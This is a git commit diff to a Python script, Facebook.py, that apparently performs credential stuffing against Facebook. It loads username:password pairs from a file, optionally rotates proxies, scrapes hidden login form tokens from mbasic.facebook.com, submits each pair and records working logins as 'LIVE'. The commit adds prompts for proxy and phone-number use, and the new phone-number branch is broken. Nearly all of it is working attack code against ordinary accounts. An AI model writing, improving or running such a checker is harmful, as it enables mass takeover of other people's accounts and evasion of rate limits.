59f2a49a2b1bd1e7c36302c0096444fd32dd3849
Mohamed Ahmed <43890671+mohamedmed01345@users.noreply.github.com>
2020-09-01 15:54:04 +0200

    Update Facebook.py

--- Facebook.py
+++ Facebook.py
@@ -8,16 +8,33 @@ headers = {
     "Origin"    : "https://mbasic.facebook.com",
     "Referer"   : "https://mbasic.facebook.com/"
     }
+Q1 = input("""Do you use proxies ?
+[1] Yes
+[2] NO
+>>> """)
+Q2 = input("""Do you use phone numbers ?
+[1] Yes
+[2] NO
+>>> """)
 _input = open("input.txt","r").readlines()
-proxies = open("proxies.txt","r").readlines()
-rand.shuffle(proxies)
+if Q1 == "1" :
+    proxies = open("proxies.txt","r").readlines()
+    rand.shuffle(proxies)
+else :
+    pass
 print(len(list(_input)))
 def start(USER,PASS):
-    proxy = rand.choice(proxies)
+    if Q1 == "1" :
+        proxy = rand.choice(proxies)
+    else :
+        pass
     ###----CookieJar----####
     cookieJar = rq.cookies.RequestsCookieJar()
     ###----FirstRequest----###
-    Rq_Get_1 = rq.get("https://mbasic.facebook.com/",proxies={"http":"http://"+proxy,"https":"https://"+proxy})
+    if Q1 == "1" :
+        Rq_Get_1 = rq.get("https://mbasic.facebook.com/",proxies={"http":"http://"+proxy,"https":"https://"+proxy})
+    else :
+        Rq_Get_1 = rq.get("https://mbasic.facebook.com/")
     ###----Stuff----###
     m_ts = Rq_Get_1.text[re.search('name="m_ts" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="li"',Rq_Get_1.text).start()]
     li = Rq_Get_1.text[re.search('name="li" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="try_number"',Rq_Get_1.text).start()]
@@ -41,14 +58,17 @@ def start(USER,PASS):
             "pass":PASS,
             "login":"Log+In"
             }
-    Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data,,proxies={"http":"http://"+proxy,"https":"https://"+proxy})
+    if Q1 == "1" :
+        Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data,proxies={"http":"http://"+proxy,"https":"https://"+proxy})
+    else :
+        Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data)
     #with open("result.html","w") as result:
      #   result.write(Rq_Post_0_send.text)
     if "هل نسيت كلمة السر؟" in Rq_Post_0_send.text or "Forgotten password?" in Rq_Post_0_send.text :
         print(USER+":"+PASS+"[DEAD]")
         with open("resultDEAD.text","a") as resultDEAD:
             resultDEAD.write(USER+":"+PASS)
-    else if "https://mbasic.facebook.com/login/save-device" in Rq_Post_0_send.url or "بحث عن أصدقاء" in Rq_Post_0_send.text or "Find Friends" in Rq_Post_0_send.text :
+    elif "https://mbasic.facebook.com/login/save-device" in Rq_Post_0_send.url or "بحث عن أصدقاء" in Rq_Post_0_send.text or "Find Friends" in Rq_Post_0_send.text :
         print(USER+":"+PASS+"[LIVE]")
         with open("resultsLIVE.text","a") as resultLIVE:
             resultLIVE.write(USER+":"+PASS)
@@ -57,7 +77,11 @@ def start(USER,PASS):
             resultsUNKOWN.write(USER+":"+PASS)
 i = 0
 while i <= len(list(_input)) :
-    USER, PASS = _input[i].split(":")
+    if Q2 == "1":
+        USER = _input
+        PASS = _input
+    else:
+        USER, PASS = _input[i].split(":")
     start(USER,PASS)
     i += 1
     if i == len(list(_input)):
